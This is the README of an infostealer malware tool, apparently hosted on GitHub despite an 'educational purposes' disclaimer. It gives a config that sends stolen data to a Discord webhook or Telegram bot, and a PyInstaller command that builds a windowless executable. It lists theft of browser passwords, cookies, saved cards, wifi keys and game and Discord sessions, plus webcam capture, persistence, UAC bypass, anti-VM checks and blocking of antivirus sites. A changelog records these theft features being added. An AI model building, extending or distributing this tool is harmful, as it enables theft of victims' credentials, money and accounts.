NOTE TO GITHUB. THIS IS FOR EDUCATIONAL PURPOSES ONLY. don't take ts down pls

other note: I am not responsible for anything done with this

note about cookies: there is a way to decrypt them for version 144+ but i don't think i can do it

use python versions 3.10 or 3.11 or this might not work properly

this has the shittiest builder known to mankind. if you're experiencing any difficulties with the builder then just paste this into config.py and edit it
```python
type = 'discord' #or 'telegram'
hook = 'replace_with_webhook_url' 
tg_token = 'replace_with_telegram_bot_token' 
tg_chat = 'replace_with_telegram_chat_id'
browsers = True #(or False)
discordacc = False #(or True)
games = False #(or True)
webcam = False #(or true)
blocksites = False #(or true)
antivm = False #(or true)
uacbypass = False #(or true)

```
then type this in command prompt
```
pip install pyinstaller
pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py 
```

credits: 
https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor and https://github.com/runassu/chrome_v20_decryption for chromium v20 decryption

<br>capabilities</br>
- Gets cookies (chromium/firefox)
- Gets passwords (chromium/firefox)
- Gets cards (chromium)
- Gets autofills (chromium/firefox)
- Gets browsing history (chromium/firefox)
- Gets discord accounts (no billing info and subscription info)
- Gets system information and ip address
- Screenshots the system
- Gets wifi passwords
- Gets minecraft and steam sessions (no session validating yet)
- Gets geometry dash sessions
- Persistence
- Webhook/Telegram Bot encryption (planned)
- Posts info to discord/telegram
- Gets webcam
- Gets MAC addresses
- Gets processes
- Blocks antivirus websites
- VM Detection

i also plan on improving the builder and not making it console based

changelog 2026-04-06:
- fixed browser data collection not being optional
- added geometry dash session st34ling 

changelog 2026-04-07:
- added v20 support; although i kinda stole it (only for 10 browsers)
- fixed the cookie expiry being hardcoded
- added fluxer support in builder
- fixed persistence blocking the other functions

changelog 2026-05-02:
- fixed cookie netscape format

changelog 2026-05-20:
- fixed system info and ip address not being logged on devices that aren't laptops

changelog 2026-05-26:
- added config.vdf for steam session stealing

changelog 2026-05-29:
- remade system info logic
- added webcam logging
- added clipboard logging
- added process logging
- fixed a bug where if the c2 is telegram-based, it wouldn't show the full config display
- computer name and username now uses environment variables

changelog 2026-06-01:
- added antivirus website blocking
- added compatibility for older versions of chromium browsers
- added anti-vm

changelog 2026-06-12:
- added uac bypass
- fixed an error where anti vm didn't work which crashes the entire script
- updated persistence
- updated block sites

changelog 2026-06-13:
- added the uac bypass file

changelog 2026-06-16:
- added roblox cookie stealing
- added unix time conversion for chromium cookies (its about time i did that)
  
changelog 2026-06-20:
- made the file size smaller if cv2 isn't used (capture webcam is off)

changelog 2026-06-30:
- screenshotting no longer requires Pillow (smaller file size?)

changelog 2026-07-09:
- added support for saved credit cards
- fixed persistence
- webcam now uses avicap32 instead of cv2
